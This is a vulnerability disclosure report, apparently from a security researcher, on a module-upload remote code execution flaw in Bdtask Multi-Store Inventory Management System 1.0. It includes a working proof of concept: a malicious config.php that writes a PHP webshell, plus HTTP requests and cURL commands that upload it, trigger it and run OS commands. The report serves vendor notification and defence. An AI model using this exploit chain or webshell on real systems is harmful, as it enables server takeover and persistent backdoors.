# CVE-PENDING: Bdtask Multi-Store Inventory Management System 1.0 - Remote Code Execution via Module Upload

## Vulnerability Information

| Field       | Detail                                     |
|-------------|--------------------------------------------|
| **Product** | Multi-Store Inventory Management System    |
| **Vendor**  | Bdtask                                     |
| **Version** | 1.0                                        |
| **Type**    | Remote Code Execution (CWE-94)             |
| **Author**  | Kevin Chiang                               |
| **Date**    | 2026-05-05                                 |
| **CVSS**    | 8.5 (AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H)  |

---

## Affected Component

- **Upload Endpoint**: `application/modules/dashboard/controllers/Module.php`
- **Upload Function**: `upload()`
- **Sink File**: `application/modules/dashboard/views/module/add.php`
- **Parameter**: `module` (multipart/form-data file upload)

---

## Description

A remote code execution vulnerability was found in bdtask Multi-Store
Inventory Management System 1.0. It affects the module upload feature
of the file `application/modules/dashboard/controllers/Module.php`.
The application accepts ZIP archives uploaded by an authenticated admin
and extracts them into `application/modules/`. When the
**Add Module** view is subsequently rendered, the application executes
`@include()` on the uploaded `config/config.php` file without any
validation of its contents. This allows an attacker to execute arbitrary
PHP code on the server.

The root cause is the unsafe inclusion of an attacker-controlled PHP
file. The `@include()` is triggered every time the **Add Module** page
is loaded:

```php
// application/modules/dashboard/views/module/add.php (line 50-51)
if (file_exists($file) && file_exists($db) && file_exists($image)) {
    @include($file);   // attacker-controlled PHP is executed here
```

A second `@include()` on the same path also exists in
`Module.php::install()` at line 97.

---

## Steps to Reproduce

### Environment

- OS: Ubuntu 22.04.5 LTS
- Web Server: Apache 2.4.18
- PHP: 7.0.5
- Test URL: `http://localhost:8080/`

### Steps

1. Install Multi-Store Inventory Management System v1.0 on a local
   XAMPP environment
2. Log in with an **admin** account
3. Prepare the malicious module (see *Proof of Concept* below)
4. Navigate to: `http://localhost:8080/dashboard/module/add_module`
5. Upload `test_module.zip`
6. Reload the **Add Module** page (or wait for the post-upload redirect)
7. Access the dropped webshell at
   `http://localhost:8080/shell.php?cmd=id`
<img width="1845" height="801" alt="image" src="https://github.com/user-attachments/assets/0c79d2c4-03a7-41ae-8ec0-8295030913ca" />


---

## Proof of Concept

### Malicious Module Structure

```
test_module/
├── assets/
│   ├── data/
│   │   └── database.sql       (empty file)
│   └── images/
│       └── thumbnail.jpg      (any small JPEG)
└── config/
    └── config.php             (malicious PHP)
```

### `config/config.php` Content

```php
<?php
file_put_contents(FCPATH . 'shell.php', '<?php system($_GET["cmd"]); ?>');

$HmvcConfig['test_module'] = array(
    '_title'       => 'Test Module',
    '_description' => 'PoC',
    '_database'    => false,
    '_tables'      => array()
);
?>
```

### Build the ZIP

```bash
zip -r test_module.zip test_module/
```

### Vulnerable HTTP Request (Upload Step)

```http
POST /dashboard/module/upload HTTP/1.1
Host: localhost:8080
Content-Type: multipart/form-data; boundary=----boundary
Cookie: ci_session=[your-session-id]
```

### Trigger Step

```http
GET /dashboard/module/add_module HTTP/1.1
Host: localhost:8080
Cookie: ci_session=[your-session-id]
```

When the page renders, `add.php:51` executes
`@include('application/modules/test_module/config/config.php')`,
which writes `shell.php` to the application root.

### Webshell Access

```http
GET /shell.php?cmd=id HTTP/1.1
Host: localhost:8080
```

**Expected Result**: The HTTP response body contains the output of
`id` executed under the web server user (e.g. `uid=33(www-data)...`).

### cURL PoC

```bash
# 1. Upload the malicious module
curl 'http://localhost:8080/dashboard/module/upload' \
  -X POST \
  -H 'Cookie: ci_session=[your-session-id]' \
  -F 'module=@test_module.zip'

# 2. Trigger the @include() by loading the Add Module page
curl 'http://localhost:8080/dashboard/module/add_module' \
  -H 'Cookie: ci_session=[your-session-id]'

# 3. Execute arbitrary commands via the dropped webshell
curl 'http://localhost:8080/shell.php?cmd=id'
```

---

## Code Flow

```
[Attacker]
   │
   │ POST /dashboard/module/upload  (module=test_module.zip)
   ↓
Module.php::upload()                       
   │  CI Upload library saves ZIP
   │  Unzip::extract() extracts archive
   ↓
Unzip.php::_zip()                          
   │  $zip->extractTo($extractTo)          
   │  → application/modules/test_module/   created
   ↓
HTTP redirect to dashboard/module/add_module
   │
   ↓
views/module/add.php
   │  $file = "application/modules/test_module/config/config.php"
   │  if (file_exists($file) && ...):     
   │      @include($file);                  【SINK】
   ↓
Attacker-controlled PHP executes
   │  file_put_contents(FCPATH.'shell.php', '<?php system(...) ?>')
   ↓
GET /shell.php?cmd=id  →  arbitrary command execution
```

---

## Impact

An authenticated admin attacker can:

- Execute arbitrary PHP code on the server
- Execute arbitrary OS commands under the web server user
- Read, modify, or destroy any file accessible to the web server
- Establish a persistent backdoor via the dropped webshell

---

## Vendor Notification

| Date       | Action                     |
|------------|--------------------------- |
| 2026-05-05 | Vendor notified via email  |
| 2026-06-05 | Public disclosure deadline |

---

## References

- Vendor homepage: https://www.bdtask.com/
- Related CWE: CWE-94 (Improper Control of Generation of Code / Code Injection)
- Related CWE: CWE-434 (Unrestricted Upload of File with Dangerous Type)
